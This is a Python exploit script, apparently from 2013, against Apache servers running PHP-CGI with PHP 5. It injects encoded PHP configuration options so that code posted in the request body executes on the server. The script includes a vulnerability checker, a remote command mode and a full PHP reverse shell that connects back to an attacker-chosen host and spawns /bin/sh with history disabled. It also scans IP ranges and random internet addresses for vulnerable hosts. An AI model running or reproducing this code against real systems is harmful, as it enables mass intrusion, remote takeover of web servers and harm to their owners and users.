#!/usr/bin/env python
#
# ap-unlock-v1337.py - apache + php 5.* rem0te c0de execution exploit
#
# NOTE:
#   - quick'n'dirty VERY UGLYY C=000DEEE IZ N0T MY STYLE :(((
#   - for connect back shell start netcat/nc and bind port on given host:port
#   - is ip-range scanner not is multithreaded, but iz multithreaded iz in
#   random scanner and is scanner from file (greets to MustLive)
#   - more php paths can be added
#   - adjust this shit for windows b0xes
#
# 2013
# by noptrix - http://nullsecurity.net/

import sys, socket, argparse, threading, time, random, select, ssl


NONE = 0
VULN = 1
SCMD = 2
XPLT = 3

t3st = 'POST /cgi-bin/php/%63%67%69%6E/%70%68%70?%2D%64+%61%6C%75%6F%6E+%2D' \
        '%64+%6D%6F%64+%2D%64+%73%75%68%6F%6E%3D%6F%6E+%2D%64+%75%6E%63%74%73' \
        '%3D%22%22+%2D%64+%64%6E%65+%2D%64+%61%75%74%6F%5F%70%72%%74+%2D%64+' \
        '%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+'\
        '%74%5F%3D%30+%2D%64+%75%74+%2D%6E HTTP/1.1\r\nHost:localhost\r\n'\
        'Content-Type: text/html\r\nContent-Length:1\r\n\r\na\r\n'


def m4ke_c0nn_b4ck_sh1t(cb_h0st, cb_p0rt):
    c0nn_b4ck = \
    '''
    <? set_time_limit (0); $VERSION = "1.0"; $ip = "''' + cb_h0st + '''";
    $port = ''' + cb_p0rt + '''; $chunk_size = 1400; $write_a = null;
    $error_a = null; $shell = "unset HISTFILE; uname -a; id; /bin/sh -i";
    $daemon = 0;
    $debug = 0; if (function_exists("pcntl_fork")) {$pid = pcntl_fork();
    if ($pid == -1) {exit(1);}if ($pid) {exit(0);}if (posix_setsid() == -1) {
    exit(1);}$daemon = 1;} else {print "bla";}chdir("/");umask(0);
    $sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) {
    printit("$errstr ($errno)");exit(1);}$descriptorspec = array(
    0 => array("pipe", "r"), 1 => array("pipe", "w"),2 => array("pipe", "w"));
    $process = proc_open($shell, $descriptorspec, $pipes);
    if (!is_resource($process)) {exit(1);}stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);
    printit("Successfully opened reverse shell to $ip:$port");while (1) {
    if (feof($sock)) {printit("ERROR: Shell connection terminated");break;}
    if (feof($pipes[1])) {printit("ERROR: Shell process terminated");break;}
	$read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if (in_array($sock, $read_a)) {if ($debug) printit("SOCK READ");
	$input = fread($sock, $chunk_size);if ($debug) printit("SOCK: $input");
    fwrite($pipes[0], $input);}if (in_array($pipes[1], $read_a)) {
    if ($debug) printit("STDOUT READ");$input = fread($pipes[1], $chunk_size);
	if ($debug) printit("STDOUT: $input");fwrite($sock, $input);}
	if (in_array($pipes[2], $read_a)) {if ($debug) printit("STDERR READ");
    $input = fread($pipes[2], $chunk_size);
    if ($debug) printit("STDERR: $input");fwrite($sock, $input);}}fclose($sock);
    fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);
    function printit ($string) {if (!$daemon) {print "$string\n";}}?>
    '''
    return c0nn_b4ck


def enc0dez():
    n33dz1 = ('cgi-bin', 'php')
    n33dz2 = ('-d', 'allow_url_include=on', '-d', 'safe_mode=off', '-d',
            'suhosin.simulation=on', '-d', 'disable_functions=""', '-d',
            'open_basedir=none', '-d', 'auto_prepend_file=php://input',
            '-d', 'cgi.force_redirect=0', '-d', 'cgi.redirect_status_env=0',
            '-d', 'auto_prepend_file=php://input', '-n')
    fl4g = 0
    arg5 = ''
    p4th = ''
    plus = ''

    for x in n33dz2:
        if fl4g == 1:
            plus = '+'
        arg5 = arg5 + plus + \
                ''.join('%' + c.encode('utf-8').encode('hex') for c in x)
        fl4g = 1
    for x in n33dz1:
        p4th = p4th + '/' + \
                ''.join('%' + c.encode('utf-8').encode('hex') for c in x)
    return (p4th, arg5)


def m4k3_p4yl0rd(p4yl0rd, m0de):
    p4th, arg5 = enc0dez()
    if m0de == VULN:
        p4yl0rd = t3st
    elif m0de == SCMD or m0de == XPLT:
        p4yl0rd = 'POST /' + p4th + '?' + arg5 + ' HTTP/1.1\r\n' \
                'Host: ' + sys.argv[1] + '\r\n' \
                'Content-Type: application/x-www-form-urlencoded\r\n' \
                'Content-Length: ' + str(len(p4yl0rd)) + '\r\n\r\n' + p4yl0rd
    return p4yl0rd


def s3nd_sh1t_ss1(args, m0de, c0nn_b4ck):
    pat = ('<b>Parse error</b>:', '<b>Warning</b>:')
    s = d0_c0nn3ct(args)
    try:
        ss = socket.ssl(s)
    except:
        print "-> n0 w3bs3rv3r 0n %s" % (args.h)
        return
    if m0de == VULN:
        p4yl0rd = m4k3_p4yl0rd('', m0de)
        ss.write(p4yl0rd)
        try:
            d4t4 = ss.read(8192)
        except:
            return
        for p in pat:
            if p in d4t4:
                print "-> " + args.h + " vu1n"
                return args.h
            else:
                if args.v:
                    print "-> %s n0t vu1n" % (args.h)
                    return
    elif m0de == SCMD:
        p4yl0rd = m4k3_p4yl0rd('<? system("' + args.c + '"); ?>', m0de)
        ss.write(p4yl0rd)
        rd, wd, ex = select.select([s], [], [], float(args.T))
        if rd:
            for l1n3 in ss.read():
                sys.stdout.write(l1n3)
    elif m0de == XPLT:
        p4yl0rd = m4k3_p4yl0rd(c0nn_b4ck, m0de)
        ss.write(p4yl0rd)
    else:
        if args.v:
            print "-> n0 w3bs3rv3r 0n %s" % (args.h)
    return


def s3nd_sh1t(args, m0de, c0nn_b4ck):
    pat = ('<b>Parse error</b>:', '<b>Warning</b>:')
    s = d0_c0nn3ct(args)
    if s:
        if m0de == VULN:
            p4yl0rd = m4k3_p4yl0rd('', m0de)
            s.sendall(p4yl0rd)
            try:
                d4t4 = s.recv(8192)
            except:
                return
            for p in pat:
                try:
                    if p in d4t4:
                        print "-> " + args.h + " vu1n"
                        if args.f:
                            wr1te_fil3(args)
                        return args.h
                    else:
                        if args.v:
                            print "-> %s n0t vu1n" % (args.h)
                            return
                except:
                    return
        elif m0de == SCMD:
            p4yl0rd = m4k3_p4yl0rd('<? system("' + args.c + '"); ?>', m0de)
            s.sendall(p4yl0rd)
            rd, wd, ex = select.select([s], [], [], float(args.T))
            if rd:
                try:
                    for l1n3 in s.makefile():
                        print l1n3,
                except:
                    return
        elif m0de == XPLT:
            p4yl0rd = m4k3_p4yl0rd(c0nn_b4ck, m0de)
            s.sendall(p4yl0rd)
    else:
        if args.v:
            print "-> c0uld n0t c0nn3ct t0 %s" % (args.h)
    return


def d0_c0nn3ct(args):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(float(args.t))
        res = s.connect_ex((args.h, int(args.p)))
        if res == 0:
            return s
    except socket.error:
        return
    return


def m4k3_r4nd_1p4ddr(num):
    h0sts = []
    for x in range(int(num)):
        h0sts.append('%d.%d.%d.%d' % (random.randrange(0,255),
                random.randrange(0,255), random.randrange(0,255),
                random.randrange(0,255)))
    return h0sts


def d0_sc4n(args, h0st, m0de, vu1nz, rsa, rsb):
    args.h = h0st.rstrip()
    if args.S:
        s3nd_sh1t_ss1(args, m0de, None)
    else:
        s3nd_sh1t(args, m0de, None)
    return


def sc4n_r4ng3(args, m0de, rsa, rsb):
    vu1nz = []
    for i in range (rsa[0], rsb[0]):
        for j in range (rsa[1], rsb[1]):
            for k in range (rsa[2], rsb[2]):
                for l in range(rsa[3], rsb[3]):
                    args.h = str(i) + "." + str(j) + "." + str(k) + "." + str(l)
                    if args.S:
                        s3nd_sh1t_ss1(args, m0de, None)
                    else:
                        s3nd_sh1t(args, m0de, None)
    return


def m4k3_ipv4_r4ng3(iprange):
    a = tuple(part for part in iprange.split('.'))
    rsa = (range(4))
    rsb = (range(4))
    for i in range(0,4):
        ga = a[i].find('-')
        if ga != -1:
            rsa[i] = int(a[i][:ga])
            rsb[i] = int(a[i][1+ga:]) + 1
        else:
            rsa[i] = int(a[i])
            rsb[i] = int(a[i]) + 1
    return (rsa, rsb)


def parse_args():
    p = argparse.ArgumentParser(
    usage='\n\n  ./ap-unlock-v1337.py -h <4rg> -s | -c <4rg> | -x <4rg> ' \
            '[0pt1ons]\n  ./ap-unlock-v1337.py -r <4rg> | -R <4rg> | -i <4rg>'\
            ' [0pt1ons]',
    formatter_class=argparse.RawDescriptionHelpFormatter, add_help=False)
    opts = p.add_argument_group('0pt1ons', '')
    opts.add_argument('-h', metavar='wh1t3h4tz.0rg',
            help='| t3st s1ngle h0st f0r vu1n')
    opts.add_argument('-p', default=80, metavar='80',
            help='| t4rg3t p0rt (d3fau1t: 80)')
    opts.add_argument('-S', action='store_true',
            help='| c0nn3ct thr0ugh ss1')
    opts.add_argument('-c', metavar='\'uname -a;id\'',
            help='| s3nd c0mm4nds t0 h0st')
    opts.add_argument('-x', metavar='192.168.0.2:1337',
            help='| c0nn3ct b4ck h0st 4nd p0rt f0r sh3ll')
    opts.add_argument('-s', action='store_true',
            help='| t3st s1ngl3 h0st f0r vu1n')
    opts.add_argument('-r', metavar='133.1.3-7.7-37',
            help='| sc4nz iP addr3ss r4ng3 f0r vu1n')
    opts.add_argument('-R', metavar='1337',
            help='| sc4nz num r4nd0m h0st5 f0r vu1n')
    opts.add_argument('-t', default=2, metavar='2',
            help='| c0nn3ct t1me0ut in s3x (d3fau1t: 3)')
    opts.add_argument('-T', default=2, metavar='2',
            help='| r3ad t1me0ut in s3x (d3fau1t: 3)')
    opts.add_argument('-f', metavar='vu1n.lst',
            help='| wr1t3 vu1n h0sts t0 f1l3')
    opts.add_argument('-i', metavar='sc4nz.lst',
            help='| sc4nz h0sts fr0m f1le f0r vu1n')
    opts.add_argument('-v', action='store_true',
            help='| pr1nt m0ah 1nf0z wh1l3 sh1tt1ng')
    args = p.parse_args()
    if not args.h and not args.r and not args.R and not args.i:
        p.print_help()
        sys.exit(0)
    return args


def wr1te_fil3(args):
    try:
        f = open(args.f, "a+")
        f.write(args.h + "\n")
        f.close()
    except:
        sys.stderr.write('[-] 3rr0r: de1n3 mudd1 k0cht guT')
        sys.stderr.write('\n')
        raise SystemExit()
    return


def run_threads(args, h0sts, m0de, vu1nz, rsa, rsb):
    num_h0sts = len(h0sts)
    num = 0
    try:
        if args.r:
            sc4n_r4ng3(args, m0de, rsa, rsb)
        else:
            for h0st in h0sts:
                num += 1
                if args.v:
                    sys.stdout.flush()
                    sys.stdout.write("[" + str(num) + "/" + str(num_h0sts) +
                            "] ")
                else:
                    sys.stdout.flush()
                    sys.stdout.write("\r[+] h0sts sc4nn3d: " + str(num) +
                            "/" + str(num_h0sts) + "  \b")
                t = threading.Thread(target=d0_sc4n, args=(args, h0st, m0de,
                    vu1nz, None, None))
                t.start()
                t.join()
    except KeyboardInterrupt:
        sys.stdout.flush()
        sys.stdout.write("\b\b[!] w4rn1ng: ab0rt3d bY us3r\n")
        raise SystemExit
    return


def c0ntr0ller():
    vu1nz = []
    m0de = NONE
    try:
        args = parse_args()
        if args.h:
            if args.s:
                print "[+] sc4nn1ng s1ngl3 h0st %s " % (args.h)
                m0de = VULN
                if args.S:
                    s3nd_sh1t_ss1(args, m0de, None)
                else:
                    s3nd_sh1t(args, m0de, None)
            elif args.c:
                print "[+] s3nd1ng c0mm4ndz t0 h0st %s " % (args.h)
                m0de = SCMD
                if args.S:
                    s3nd_sh1t_ss1(args, m0de, None)
                else:
                    s3nd_sh1t(args, m0de, None)
            elif args.x:
                print "[+] xpl0it1ng b0x %s " % (args.h)
                m0de = XPLT
                if args.x.find(':') != -1:
                    if not args.x.split(':')[1]:
                        print "[-] 3rr0r: p0rt m1ss1ng"
                    else:
                        cb_h0st = args.x.split(':')[0]
                        cb_p0rt = args.x.split(':')[1]
                else:
                    print "[-] 3rr0r: <h0st>:<p0rt> y0u l4m3r"
                c0nn_b4ck = m4ke_c0nn_b4ck_sh1t(cb_h0st, cb_p0rt)
                if args.S:
                    s3nd_sh1t_ss1(args, m0de, c0nn_b4ck)
                else:
                    s3nd_sh1t(args, m0de, c0nn_b4ck)
            else:
                print "[-] 3rr0r: m1ss1ng -s, -c 0r -x b1tch"
                sys.exit(-1)
        if args.r:
            print "[+] sc4nn1ng r4ng3 %s " % (args.r)
            m0de = VULN
            rsa, rsb = m4k3_ipv4_r4ng3(args.r)
            run_threads(args, None, m0de, None, rsa, rsb)
        if args.R:
            print "[+] sc4nn1ng %d r4nd0m b0xes" % (int(args.R))
            m0de = VULN
            h0sts = m4k3_r4nd_1p4ddr(int(args.R))
            run_threads(args, h0sts, m0de, vu1nz, None, None)
        if args.i:
            print "[+] sc4nn1ng b0xes fr0m f1le %s" % (args.i)
            m0de = VULN
            h0sts = tuple(open(args.i, 'r'))
            run_threads(args, h0sts, m0de, vu1nz, None, None)
    except KeyboardInterrupt:
        sys.stdout.flush()
        sys.stderr.write("\b\b[!] w4rn1ng: ab0rt3d bY us3r\n")
        raise SystemExit
    return


def m41n():
    if  __name__ == "__main__":
        print "--==[ ap-unlock-v1337.py by noptrix@nullsecurity.net ]==--"
        c0ntr0ller()
    else:
        print "[-] 3rr0r: y0u fuck3d up dud3"
        sys.exit(1)
    print "[+] h0p3 1t h3lp3d"


# \o/ fr33 requiem 1337 h4x0rs ...
m41n()

# e0F